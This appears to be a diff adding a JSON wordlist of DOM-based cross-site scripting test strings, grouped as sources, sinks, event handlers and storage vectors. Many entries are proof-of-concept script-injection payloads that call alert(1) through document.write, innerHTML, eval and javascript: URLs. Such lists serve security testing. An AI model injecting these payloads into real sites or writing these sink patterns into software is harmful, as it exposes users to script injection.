@@ -1,0 +1,62 @@
+{
+  "dom_based": [
+    "document.location.hash.substring(1)",
+    "document.location.search.substring(1)",
+    "document.referrer",
+    "window.name",
+    "localStorage.getItem('data')",
+    "sessionStorage.getItem('data')",
+    "document.cookie",
+    "history.pushState(null, null, '<img src=x onerror=alert(1)>')",
+    "window.location.href = 'javascript:alert(1)'",
+    "eval(location.hash.substr(1))"
+  ],
+  "dom_sinks": [
+    "document.write('<script>alert(1)</script>')",
+    "document.writeln('<script>alert(1)</script>')",
+    "document.body.innerHTML = '<script>alert(1)</script>'",
+    "document.getElementById('test').innerHTML = '<script>alert(1)</script>'",
+    "document.getElementById('test').outerHTML = '<div id=\"test\"><script>alert(1)</script></div>'",
+    "document.createElement('script').text = 'alert(1)'",
+    "document.createElement('script').innerText = 'alert(1)'",
+    "document.createElement('script').textContent = 'alert(1)'",
+    "document.implementation.createHTMLDocument('').write('<script>alert(1)</script>')",
+    "eval('alert(1)')"
+  ],
+  "dom_sources": [
+    "location",
+    "location.href",
+    "location.search",
+    "location.hash",
+    "location.pathname",
+    "document.referrer",
+    "document.URL",
+    "document.documentURI",
+    "document.baseURI",
+    "document.cookie"
+  ],
+  "dom_events": [
+    "window.onload = function() { alert(1) }",
+    "window.onhashchange = function() { alert(1) }",
+    "window.onpopstate = function() { alert(1) }",
+    "window.onmessage = function() { alert(1) }",
+    "window.onerror = function() { alert(1) }",
+    "window.onbeforeunload = function() { alert(1) }",
+    "window.onunload = function() { alert(1) }",
+    "window.onpagehide = function() { alert(1) }",
+    "window.onpageshow = function() { alert(1) }",
+    "window.onresize = function() { alert(1) }"
+  ],
+  "dom_storage": [
+    "localStorage.setItem('xss', '<script>alert(1)</script>')",
+    "localStorage.getItem('xss')",
+    "sessionStorage.setItem('xss', '<script>alert(1)</script>')",
+    "sessionStorage.getItem('xss')",
+    "document.cookie = 'xss=<script>alert(1)</script>'",
+    "document.cookie.match(/xss=([^;]+)/)[1]",
+    "window.name = '<script>alert(1)</script>'",
+    "window.name",
+    "history.pushState(null, null, '<script>alert(1)</script>')",
+    "history.state"
+  ]
+}
